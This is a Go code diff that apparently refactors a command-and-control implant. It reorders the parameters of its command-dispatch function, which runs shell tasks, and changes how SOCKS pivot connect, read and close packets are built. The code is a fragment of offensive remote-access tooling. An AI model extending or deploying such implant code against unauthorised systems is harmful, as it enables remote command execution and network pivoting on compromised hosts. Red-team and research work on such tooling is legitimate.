@@ -133,7 +133,7 @@ func processResponse(resp *http.Response) error {
 			return fmt.Errorf("parsing packet: %w", err)
 		}
 		if cmdBuf != nil {
-			executeCommand(cmdType, taskID, cmdBuf)
+			executeCommand(cmdType, cmdBuf, taskID)
 		}
 	}
 	return nil
@@ -146,19 +146,19 @@ func serviceSocks() {
 
 		switch ev.Type {
 		case commands.CALLBACK_CONNECT:
-			pkt := transports.MakePacket(commands.CALLBACK_CONNECT, ev.TaskID, socketIDBytes)
+			pkt := transports.MakePacketPivot(commands.CALLBACK_CONNECT, socketIDBytes)
 			transports.QueueResult(pkt)
 		case commands.CALLBACK_READ:
-			pkt := transports.MakePacket(commands.CALLBACK_READ, ev.TaskID, ev.Data)
+			pkt := transports.MakePacketPivot(commands.CALLBACK_READ, ev.Data)
 			transports.QueueResult(pkt)
 		case commands.CALLBACK_CLOSE:
-			pkt := transports.MakePacket(commands.CALLBACK_CLOSE, ev.TaskID, socketIDBytes)
+			pkt := transports.MakePacketPivot(commands.CALLBACK_CLOSE, socketIDBytes)
 			transports.QueueResult(pkt)
 		}
 	}
 }
 
-func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
+func executeCommand(cmdType uint32, cmdBuf []byte, taskID [8]byte) {
 	switch cmdType {
 	case commands.CMD_TYPE_SHELL:
 		rawPath, shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
@@ -269,7 +269,7 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
 		port := binary.BigEndian.Uint16(cmdBuf[4:6])
 		host := strings.TrimRight(string(cmdBuf[6:]), "\x00")
-		pivot.Connect(socketID, host, port, taskID)
+		pivot.Connect(socketID, host, port)
 
 	case commands.CMD_TYPE_SEND:
 		if len(cmdBuf) < 4 {
@@ -291,7 +291,7 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 		}
 		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
 		port := binary.BigEndian.Uint16(cmdBuf[4:6])
-		if err := pivot.Listen(socketID, port, taskID); err != nil {
+		if err := pivot.Listen(socketID, port); err != nil {
 			commands.ProcessErrorWithTaskID(err.Error(), taskID)
 		}
 
